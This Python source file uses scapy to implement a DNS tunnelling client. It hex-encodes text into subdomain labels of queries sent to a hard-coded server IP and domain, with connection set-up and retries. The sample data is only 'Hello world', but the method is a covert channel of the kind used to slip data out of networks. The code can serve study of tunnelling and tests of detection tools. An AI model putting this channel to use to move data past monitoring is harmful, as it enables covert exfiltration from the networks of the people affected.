from scapy.all import *
import base64
import binascii
import time

# Configuration
DNS_SERVER_IP = '13.228.229.230'  # Replace with your DNS server IP
DNS_PORT = 53
DOMAIN = 'sub.brightbuys.me'  # Replace with the actual domain
char_queue = 5  # The number of characters to queue before sending a packet


# Function to send DNS query
def send_dns_query(encoded_data, domain, packet_number, connection_id):
    # Format the DNS query name like "b.packet_number.connection_id.data.domain"
    query_name = f"b.{packet_number}.{connection_id}.{encoded_data}.{domain}"

    print(f"Sending DNS query: {query_name}")

    # Create a DNS query packet
    dns_query = IP(dst=DNS_SERVER_IP) / UDP(dport=DNS_PORT) / DNS(rd=1,
                                                                  qd=DNSQR(qname=query_name, qtype=1))  # A record query

    dns_query.show()
    # Send the packet and receive response
    response = sr1(dns_query, verbose=0, timeout=2)  # Wait for response
    if response and response.haslayer(DNS):
        answer = response[DNS].an
        if answer:
            # Assuming the response code is embedded in the DNS answer
            return str(answer.rdata)
    return None


# Function to initiate a connection
def initiate_connection(domain):
    # Send an initial query to get the connection ID (similar to "dig a.1.1.1.example.com A +short")
    query_name = f"a.1.1.1.{domain}"
    dns_query = IP(dst=DNS_SERVER_IP) / UDP(dport=DNS_PORT) / DNS(rd=1, qd=DNSQR(qname=query_name, qtype=1))  # A record
    dns_query.show()
    response = sr1(dns_query, verbose=0, timeout=2)  # Wait for response
    if response and response.haslayer(DNS):
        answer = response[DNS].an
        if answer:
            connection_id = str(answer.rdata).split('.')[-1]  # Get connection ID from the IP response
            return connection_id
    return None


# Main function to read input and send data
def send_data_to_server(data, domain):
    connection_id = initiate_connection(domain)
    if not connection_id:
        print("Connection failed. Exiting.")
        return

    packet_number = 0
    char_queue = 5
    letters = ""

    # Read through the data
    for letter in data:
        letters += letter

        # If letters exceed char_queue, send them
        if len(letters) >= char_queue:
            # Convert letters to hex
            encoded_data = binascii.hexlify(letters.encode()).decode()

            # Send the DNS query with the encoded data
            response_code = send_dns_query(encoded_data, domain, packet_number, connection_id)
            print(f"Response code: {response_code}")

            # Check for failures and retry if needed
            retries = 0
            while response_code != "200" and retries < 5:
                time.sleep(0.25)  # Sleep to prevent spamming
                print(f"Retrying packet {packet_number}")
                response_code = send_dns_query(encoded_data, domain, packet_number, connection_id)
                retries += 1

            # Clear the letters and increment packet number
            letters = ""
            packet_number += 1
            if packet_number > 999:
                packet_number = 0  # Reset packet number if too large

            time.sleep(0.25)  # Prevent spamming


if __name__ == "__main__":
    # Example usage: send a string "Hello world" to the server
    send_data_to_server("Hello world", DOMAIN)
